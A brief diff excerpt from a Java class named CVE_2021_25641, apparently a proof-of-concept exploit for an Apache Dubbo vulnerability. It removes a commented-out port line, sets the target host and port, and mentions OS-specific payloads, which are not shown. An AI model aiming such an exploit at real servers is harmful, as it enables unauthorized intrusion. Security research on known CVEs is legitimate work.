@@ -23,7 +23,6 @@ import java.net.Socket;
 public class CVE_2021_25641 {
     // Customize URL for remote targets
     public static String DUBBO_HOST_NAME = "localhost";
-    //    public static int    DUBBO_HOST_PORT = 20880;
     public static int    DUBBO_HOST_PORT = 12345;
 
     // OS-specific payloads - comment to switch OS variants
